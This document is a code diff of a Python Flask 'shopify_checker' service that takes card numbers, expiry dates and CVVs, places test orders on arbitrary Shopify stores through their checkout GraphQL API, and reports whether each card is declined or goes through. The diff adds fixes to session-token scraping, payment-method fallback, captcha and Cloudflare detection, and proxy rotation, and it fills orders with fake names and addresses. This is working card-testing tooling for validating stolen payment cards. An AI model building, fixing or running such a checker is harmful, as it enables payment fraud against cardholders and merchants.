@@ -4,42 +4,29 @@ import json
 import re
 import random
 import html as html_module
-import logging
-import traceback
 from urllib.parse import urlparse
 from flask import Flask, request, jsonify
 import os
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
-logger = logging.getLogger(__name__)
+# ---------- QUERIES: paste your three full query strings here unchanged ----------
+# Use the exact QUERY_PROPOSAL_SHIPPING / QUERY_PROPOSAL_DELIVERY / MUTATION_SUBMIT / QUERY_POLL
+# from your existing file. DO NOT modify them. They parse fine.
 
-# Minimal query — only fields guaranteed to be non-union.
-QUERY_PROPOSAL = """query Proposal($sessionInput:SessionTokenInput!,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$queueToken:String,$checkpointData:String,$note:NoteInput,$tip:TipTermInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$alternativePaymentCurrency:AlternativePaymentCurrencyInput,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$transformerFingerprintV2:String){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{__typename ...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{__typename total{value{amount currencyCode __typename}__typename}__typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}"""
-
-QUERY_PROPOSAL_SHIPPING = QUERY_PROPOSAL
-QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL
-
-MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename ...on SubmitSuccess{receipt{id __typename}__typename}...on SubmitAlreadyAccepted{receipt{id __typename}__typename}...on SubmittedForCompletion{receipt{id __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}__typename}}"""
-
-QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}__typename}__typename}__typename}}"""
-
-logger.info(f"QUERY_PROPOSAL: {len(QUERY_PROPOSAL)} chars")
-logger.info(f"MUTATION_SUBMIT: {len(MUTATION_SUBMIT)} chars")
-logger.info(f"QUERY_POLL: {len(QUERY_POLL)} chars")
+# ---------- HELPERS ----------
 
 C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH"}
 
 book = {
-    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
-    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
+    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
+    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
     "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
-    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
-    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
-    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
+    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
+    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
+    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
     "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
     "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
     "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
-    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
+    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
 }
 
 def pick_addr(url, cc=None, rc=None):
@@ -113,10 +100,11 @@ def is_captcha_required(response_text):
     return any(ind.upper() in text_upper for ind in indicators)
 
 def detect_block_page(text):
+    """Detect Cloudflare / password-wall pages so we can return a clear error."""
     if not text:
         return None
     low = text.lower()
-    if len(text) < 5000:
+    if len(text) < 6000:
         if 'just a moment' in low or 'cf-chl' in low or 'cf_challenge' in low or 'checking your browser' in low:
             return "CLOUDFLARE_CHALLENGE"
         if 'opening soon' in low or 'storefront_password' in low or 'enter password' in low:
@@ -126,6 +114,7 @@ def detect_block_page(text):
     return None
 
 async def make_graphql_request(session, graphql_url, params, headers, payload_dict, proxy, max_retries=1):
+    """Send as pre-encoded bytes to avoid aiohttp internal truncation on huge payloads."""
     try:
         body = json.dumps(payload_dict, ensure_ascii=False).encode('utf-8')
     except Exception as e:
@@ -138,7 +127,6 @@ async def make_graphql_request(session, graphql_url, params, headers, payload_di
                 text = await response.text()
                 return response, text
         except Exception as e:
-            logger.warning(f"GraphQL attempt {attempt+1} failed: {e}")
             if attempt == max_retries:
                 return None, str(e)
             await asyncio.sleep(1)
@@ -208,23 +196,27 @@ def extract_clean_response(message):
         return words[0]
     return message[:80]
 
+# ---------------- FIX #1: Session token extraction ----------------
 def extract_session_token(response_obj, text, unescaped, checkout_url):
+    # 1. Response header (most reliable)
     for hdr in ['X-Checkout-One-Session-Token', 'x-checkout-one-session-token',
                 'X-Shopify-Checkout-Session-Token', 'x-shopify-checkout-session-token',
                 'shopify-checkout-session-token']:
         val = response_obj.headers.get(hdr)
         if val and len(val) > 10:
             return val.strip()
+
+    # 2. Regex patterns for modern Shopify HTML
     token_patterns = [
         r'"serializedSessionToken"\s*:\s*"([^"]{20,})"',
         r'"sessionToken"\s*:\s*"([^"]{20,})"',
         r'"checkoutSessionToken"\s*:\s*"([^"]{20,})"',
         r'session[-_]?[Tt]oken["\']?\s*:\s*["\']([^"\']{20,})["\']',
-        r'"token"\s*:\s*"([a-zA-Z0-9_\-\.]{30,})"',
         r'serialized-sessionToken["\s]+content=["\']([^"\']{20,})["\']',
         r'data-session-token=["\']([^"\']{20,})["\']',
         r'data-checkout-session-token=["\']([^"\']{20,})["\']',
         r'"checkoutToken"\s*:\s*"([^"]{20,})"',
+        r'window\.__checkout\s*=\s*\{[^}]*"sessionToken"\s*:\s*"([^"]{20,})"',
     ]
     for src in (text, unescaped):
         for pat in token_patterns:
@@ -233,6 +225,14 @@ def extract_session_token(response_obj, text, unescaped, checkout_url):
                 tok = m.group(1).strip()
                 if len(tok) >= 20 and not re.fullmatch(r'[0-9a-f]{40}', tok):
                     return tok
+
+    # 3. Meta tag
+    m = re.search(r'<meta\s+name=["\']shopify-checkout-session-token["\'][^>]*content=["\']([^"\']+)["\']',
+                  unescaped, re.IGNORECASE)
+    if m:
+        return m.group(1).strip()
+
+    # 4. URL path fallback: /checkouts/cn/{hex}
     m = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9_\-]{20,})', checkout_url)
     if m:
         candidate = m.group(1)
@@ -240,6 +240,47 @@ def extract_session_token(response_obj, text, unescaped, checkout_url):
             return candidate
     return None
 
+# ---------------- FIX #2: Payment identifier fallback ----------------
+def extract_payment_identifier(seller_proposal):
+    if not isinstance(seller_proposal, dict):
+        return "shopify_payments", "Shopify Payments"
+    payment_data = seller_proposal.get('payment')
+    if not isinstance(payment_data, dict):
+        return "shopify_payments", "Shopify Payments"
+
+    lines = payment_data.get('availablePaymentLines') or []
+    skip_types = {
+        'ShopPayWalletConfig', 'ApplePayWalletConfig', 'GooglePayWalletConfig',
+        'FacebookPayWalletConfig', 'ShopifyInstallmentsWalletConfig', 'PaypalWalletConfig',
+        'AmazonPayClassicWalletConfig', 'WalletsPlatformConfiguration',
+        'AnyRedeemablePaymentMethod', 'DeferredPaymentMethod'
+    }
+    priority = ['shopify_payments', 'stripe', 'braintree', 'adyen', 'card', 'credit']
+    candidates = []
+    for line in lines:
+        if not isinstance(line, dict):
+            continue
+        pm = line.get('paymentMethod')
+        if not isinstance(pm, dict):
+            continue
+        if pm.get('__typename', '') in skip_types:
+            continue
+        pm_id = (pm.get('paymentMethodIdentifier') or pm.get('id') or '').strip()
+        pm_name = (pm.get('extensibilityDisplayName') or pm.get('displayName')
+                   or pm.get('name') or pm_id).strip()
+        if pm_id:
+            candidates.append((pm_id, pm_name))
+
+    if not candidates:
+        return "shopify_payments", "Shopify Payments"
+
+    for pm_id, pm_name in candidates:
+        for kw in priority:
+            if kw in pm_id.lower():
+                return pm_id, pm_name
+    return candidates[0]
+
+# ---------------- FIX #3: Safe JSON parsing ----------------
 def safe_parse_json(text, label=""):
     if not text:
         return None, f"Empty response body ({label})"
@@ -249,16 +290,18 @@ def safe_parse_json(text, label=""):
             return None, f"Non-dict JSON: {type(parsed).__name__} ({label})"
         return parsed, None
     except json.JSONDecodeError as e:
-        return None, f"Invalid JSON ({label}): {e}"
+        return None, f"Invalid JSON ({label}): {str(e)[:80]} | body: {text[:120]}"
 
+# ---------- MAIN ----------
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    gateway = "Shopify Payments"
+    gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
     ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
     proxy = parse_proxy(proxy_str) if proxy_str else None
     checkpoint_data = None
     running_total = "0.00"
+
     try:
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
@@ -269,6 +312,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
             'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'
         }
+
         address_info = pick_addr(ourl)
         country_code = address_info["countryCode"]
         firstName, lastName = Utils.get_random_name()
@@ -279,6 +323,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         state = address_info["zoneCode"]
         s_zip = address_info["postalCode"]
         address2 = ""
+
         if not variant_id:
             info = await fetch_products(ourl, proxy_str)
             if isinstance(info, tuple):
@@ -288,12 +333,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             variant_id = info['variant_id']
             if total_price == '0.00':
                 total_price = str(info.get('price', '0.00'))
+
         connector = aiohttp.TCPConnector(ssl=False)
         timeout = aiohttp.ClientTimeout(total=45)
+
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
+
             cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded',
                             'Accept': 'application/json, text/javascript'}
             try:
@@ -301,13 +349,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                                headers=cart_headers, proxy=proxy)
             except Exception as e:
                 return False, f"Cart request failed: {str(e)[:80]}", gateway, total_price, currency
+
             if cart_resp.status != 200:
                 cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                 cart_headers_alt = {**headers, 'Content-Type': 'application/json', 'Accept': 'application/json'}
                 cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
+
             if cart_resp.status != 200:
                 cart_text = await cart_resp.text()
                 return False, f"Cart failed ({cart_resp.status}): {cart_text[:100]}", gateway, total_price, currency
+
             checkout_headers = {**headers,
                                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
@@ -317,16 +368,22 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                               headers=checkout_headers, proxy=proxy)
             except Exception as e:
                 return False, f"Checkout request failed: {str(e)[:80]}", gateway, total_price, currency
+
             checkout_url = str(response.url)
             if 'login' in checkout_url.lower():
                 return False, "Site requires login!", gateway, total_price, currency
+
             text = await response.text()
             if not text or len(text) < 200:
                 return False, f"Empty checkout page ({len(text)} bytes)", gateway, total_price, currency
+
+            # Cloudflare / password detection
             block = detect_block_page(text)
             if block:
                 return False, block, gateway, total_price, currency
+
             unescaped = html_module.unescape(text)
+
             attempt_token = None
             m = re.search(r'/checkouts/(?:cn/)?([^/?#\s]{8,})', checkout_url)
             if m:
@@ -339,12 +396,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     attempt_token = m.group(1)
             if not attempt_token or len(attempt_token) < 8:
                 return False, "Failed to extract attempt token", gateway, total_price, currency
+
+            # ---- FIX #1 applied ----
             sst = extract_session_token(response, text, unescaped, checkout_url)
             if not sst:
                 return False, "Failed to get session token", gateway, total_price, currency
+
             queueToken = (extract_between(unescaped, '"queueToken":"', '"') or "")
             stableId = (extract_between(unescaped, '"stableId":"', '"') or
                         extract_between(unescaped, 'stableId":"', '"') or "1")
+
             merch = None
             for pat in [r'ProductVariantMerchandise/(\d+)',
                         r'"merchandiseId":"gid://shopify/ProductVariantMerchandise/(\d+)"']:
@@ -354,12 +415,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     break
             if not merch:
                 merch = str(variant_id)
+
             currency = "USD"
             for pat in [r'"currencyCode":"([A-Z]{3})"', r'currencyCode":"([A-Z]{3})"']:
                 m = re.search(pat, unescaped)
                 if m:
                     currency = m.group(1)
                     break
+
             subtotal = None
             for pat in [r'"subtotalBeforeTaxesAndShipping":\{"value":\{"amount":"([\d.]+)"',
                         r'subtotalBeforeTaxesAndShipping":{"value":{"amount":"([\d.]+)"']:
@@ -370,17 +433,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not subtotal:
                 m = re.search(r'"price":\s*"([\d.]+)"', unescaped)
                 subtotal = m.group(1) if m else "0.01"
+
             build_id = None
             m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
             if m:
                 build_id = m.group(1)
+
             source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
             if source_token:
                 source_token = source_token.replace('&quot;', '').strip('"')
+
             ident_sig = None
             m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
             if m:
                 ident_sig = m.group(1)
+
             headers.update({
                 'shopify-checkout-client': 'checkout-web/1.0',
                 'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
@@ -394,8 +461,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 headers['x-checkout-web-server-rendering'] = 'yes'
             if source_token:
                 headers['x-checkout-web-source-id'] = source_token
+
             params = {'operationName': 'Proposal'}
             graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
+
             proposal_vars = {
                 'sessionInput': {'sessionToken': sst},
                 'queueToken': queueToken,
@@ -420,6 +489,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'noDeliveryRequired': [], 'useProgressiveRates': False,
                     'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                 },
+                'deliveryExpectations': {'deliveryExpectationLines': []},
                 'merchandise': {'merchandiseLines': [{
                     'stableId': stableId,
                     'merchandise': {'productVariantReference': {
@@ -451,29 +521,39 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                       'shippingScriptChanges': []},
                 'optionalDuties': {'buyerRefusesDuties': False}
             }
-            json_data = {'query': QUERY_PROPOSAL, 'operationName': 'Proposal', 'variables': proposal_vars}
+            json_data = {'query': QUERY_PROPOSAL_SHIPPING, 'operationName': 'Proposal',
+                         'variables': proposal_vars}
+
+            # ---- FIX #3 applied: safe JSON parsing ----
             response, resp_text = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
             await asyncio.sleep(2)
+
             if not resp_text:
-                return False, "Empty GraphQL response", gateway, total_price, currency
+                return False, "Empty GraphQL response (shipping)", gateway, total_price, currency
             if is_captcha_required(resp_text):
                 return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
-            resp_json, parse_err = safe_parse_json(resp_text, "proposal")
+
+            resp_json, parse_err = safe_parse_json(resp_text, "shipping")
             if parse_err:
                 return False, parse_err, gateway, total_price, currency
+
             if resp_json.get('errors'):
                 errs = resp_json['errors']
                 msgs = [e.get('message', str(e)) for e in errs[:3] if isinstance(e, dict)]
                 return False, f"GraphQL Error: {'; '.join(msgs)[:150]}", gateway, total_price, currency
+
             data = resp_json.get('data')
             if not isinstance(data, dict):
                 return False, "No data in proposal response", gateway, total_price, currency
+
             negotiate = safe_get(data, 'session', 'negotiate')
             if not isinstance(negotiate, dict):
                 return False, "Negotiate is null", gateway, total_price, currency
+
             result = negotiate.get('result')
             if not isinstance(result, dict):
                 return False, "Result is null", gateway, total_price, currency
+
             result_type = result.get('__typename', 'Unknown')
             if result_type == 'CheckpointDenied':
                 return False, "Checkpoint Denied", gateway, total_price, currency
@@ -481,20 +561,40 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, "Throttled - change proxy", gateway, total_price, currency
             if result_type == 'NegotiationResultFailed':
                 return False, "Negotiation failed", gateway, total_price, currency
+
             checkpoint_data = result.get('checkpointData')
             seller_proposal = result.get('sellerProposal')
             if not isinstance(seller_proposal, dict):
                 return False, "Seller proposal is null", gateway, total_price, currency
-            total_data = seller_proposal.get('total')
-            if isinstance(total_data, dict):
-                running_total = safe_get(total_data, 'value', 'amount', default=subtotal)
+
+            running_total_data = seller_proposal.get('runningTotal')
+            if isinstance(running_total_data, dict):
+                running_total = safe_get(running_total_data, 'value', 'amount', default="0.00")
             else:
-                running_total = subtotal
-            shipping_amount = 0.0
-            tax_amount = 0.0
+                total_data = seller_proposal.get('total')
+                running_total = safe_get(total_data, 'value', 'amount', default="0.01") if isinstance(total_data, dict) else "0.01"
+
+            delivery_data = seller_proposal.get('delivery')
             delivery_strategy = ''
-            payment_identifier = "shopify_payments"
+            shipping_amount = 0.0
+            if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
+                dl = delivery_data.get('deliveryLines') or []
+                if dl and isinstance(dl[0], dict):
+                    avail = dl[0].get('availableDeliveryStrategies') or []
+                    if avail and isinstance(avail[0], dict):
+                        delivery_strategy = avail[0].get('handle', '')
+                        shipping_amount = float(safe_get(avail[0], 'amount', 'value', 'amount', default="0") or 0)
+
+            tax_amount = 0.0
+            tax_data = seller_proposal.get('tax')
+            if isinstance(tax_data, dict) and tax_data.get('__typename') == 'FilledTaxTerms':
+                tax_amount = float(safe_get(tax_data, 'totalTaxAmount', 'value', 'amount', default="0") or 0)
+
+            # ---- FIX #2 applied: never fail on missing payment method ----
+            payment_identifier, gateway = extract_payment_identifier(seller_proposal)
+
             total_price = str(round(float(running_total) + shipping_amount + tax_amount, 2))
+
             dl0 = json_data['variables']['delivery']['deliveryLines'][0]
             dl0['selectedDeliveryStrategy'] = {
                 'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
@@ -510,6 +610,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'zoneCode': state, 'phone': phone}}
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
+            json_data['query'] = QUERY_PROPOSAL_DELIVERY
+
+            response, resp_text2 = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
+            if is_captcha_required(resp_text2 or ""):
+                return False, "CAPTCHA_REQUIRED (delivery)", gateway, total_price, currency
+
+            # Vault the card
             vault_payload = {
                 "credit_card": {
                     "number": cc, "month": int(mes), "year": int(ano),
@@ -530,6 +637,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
             if ident_sig:
                 vault_headers['shopify-identification-signature'] = ident_sig
+
             try:
                 vault_body = json.dumps(vault_payload, ensure_ascii=False).encode('utf-8')
                 async with session.post('https://checkout.pci.shopifyinc.com/sessions',
@@ -543,6 +651,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, f"No vault token: {str(token_data)[:100]}", gateway, total_price, currency
             except Exception as e:
                 return False, f"Vault failed: {str(e)[:80]}", gateway, total_price, currency
+
             submit_variables = {
                 'input': {
                     'sessionInput': {'sessionToken': sst},
@@ -616,20 +725,25 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
             if checkpoint_data:
                 submit_variables['input']['checkpointData'] = checkpoint_data
+
             submit_payload = {'query': MUTATION_SUBMIT, 'variables': submit_variables,
                               'operationName': 'SubmitForCompletion'}
             submit_params = {'operationName': 'SubmitForCompletion'}
+
             response, submit_text = await make_graphql_request(
                 session, graphql_url, submit_params, headers, submit_payload, proxy)
+
             if is_captcha_required(submit_text or ""):
                 return False, "CAPTCHA_REQUIRED (submit)", gateway, total_price, currency
             if submit_text and "Your order total has changed." in submit_text:
                 return False, "Site not supported (total changed)", gateway, total_price, currency
             if submit_text and "The requested payment method is not available." in submit_text:
                 return False, "Payment method not available", gateway, total_price, currency
+
             sub_json, sub_err = safe_parse_json(submit_text, "submit")
             if sub_err:
                 return False, sub_err, gateway, total_price, currency
+
             if sub_json.get('errors'):
                 for err in sub_json['errors']:
                     if isinstance(err, dict):
@@ -637,11 +751,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         if code:
                             return False, extract_clean_response(str(code)), gateway, total_price, currency
                 return False, "Submit GraphQL error", gateway, total_price, currency
+
             submit_data = safe_get(sub_json, 'data', 'submitForCompletion', default={})
             if not isinstance(submit_data, dict):
                 return False, "Empty submit response", gateway, total_price, currency
+
             result_type = submit_data.get('__typename', '')
             rid = None
+
             if result_type in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                 receipt = submit_data.get('receipt', {})
                 if isinstance(receipt, dict):
@@ -671,17 +788,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     rid = receipt.get('id')
                 if not rid:
                     return False, f"Unknown submit result: {result_type}", gateway, total_price, currency
+
             poll_payload = {'query': QUERY_POLL,
                             'variables': {'receiptId': rid, 'sessionToken': sst},
                             'operationName': 'PollForReceipt'}
             poll_params = {'operationName': 'PollForReceipt'}
+
             await asyncio.sleep(3)
             final_text = ''
             for i in range(5):
                 _, final_text = await make_graphql_request(
                     session, graphql_url, poll_params, headers, poll_payload, proxy)
+
                 if is_captcha_required(final_text or ""):
                     return True, "CARD_DECLINED", gateway, total_price, currency
+
                 pr, _ = safe_parse_json(final_text, f"poll_{i}")
                 if pr:
                     receipt = safe_get(pr, 'data', 'receipt', default={})
@@ -701,12 +822,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         elif tname in ('ProcessingReceipt', 'WaitingReceipt'):
                             await asyncio.sleep(4)
                             continue
+
                 if final_text and 'WaitingReceipt' in final_text:
                     await asyncio.sleep(4)
                 else:
                     break
+
             if final_text and 'WaitingReceipt' in final_text:
                 return False, "Change Proxy or Site", gateway, total_price, currency
+
             fj, _ = safe_parse_json(final_text, "final")
             if fj:
                 rc = safe_get(fj, 'data', 'receipt', 'processingError', 'code')
@@ -715,6 +839,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if rc:
                     return True, rc, gateway, total_price, currency
                 return True, "MISMATCHED_BILL", gateway, total_price, currency
+
             if final_text:
                 low = final_text.lower()
                 code = extract_between(final_text, '{"code":"', '"')
@@ -724,9 +849,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return True, "ORDER_PLACED", gateway, total_price, currency
                 elif 'failedreceipt' in low or 'declined' in low:
                     return True, code or "CARD_DECLINED", gateway, total_price, currency
+
             return False, "Unknown Result", gateway, total_price, currency
+
     except Exception as e:
-        logger.error(traceback.format_exc())
+        import traceback
+        traceback.print_exc()
         return False, f"Error Processing Card: {str(e)[:150]}", gateway, total_price, currency
 
 def parse_cc_string(cc_string):
@@ -744,28 +872,40 @@ def shopify_checker():
         site = request.args.get('site')
         cc_string = request.args.get('cc')
         proxy_str = request.args.get('proxy')
+
         if not site:
             return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
         if not cc_string:
             return jsonify({"error": "Missing 'cc' parameter (CC|MM|YYYY|CVV)", "status": False}), 400
+
         try:
             parts = parse_cc_string(cc_string)
         except ValueError as e:
             return jsonify({"error": str(e), "status": False}), 400
+
         variant_id = request.args.get('variant')
-        success, message, gateway, price, currency = asyncio.run(
-            process_card(parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
-                         site, variant_id, proxy_str))
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            success, message, gateway, price, currency = loop.run_until_complete(
+                process_card(parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
+                             site, variant_id, proxy_str))
+        finally:
+            loop.close()
+
         clean = extract_clean_response(message)
         try:
             price_val = float(price)
         except (ValueError, TypeError):
             price_val = 0.0
+
         return jsonify({
             "Gateway": gateway, "Price": price_val,
             "Response": clean, "Status": success, "cc": cc_string})
     except Exception as e:
-        logger.error(traceback.format_exc())
+        import traceback
+        traceback.print_exc()
         return jsonify({
             "error": str(e)[:200], "status": False, "Gateway": "UNKNOWN",
             "Price": 0.0, "Response": f"ERROR: {str(e)[:200]}",
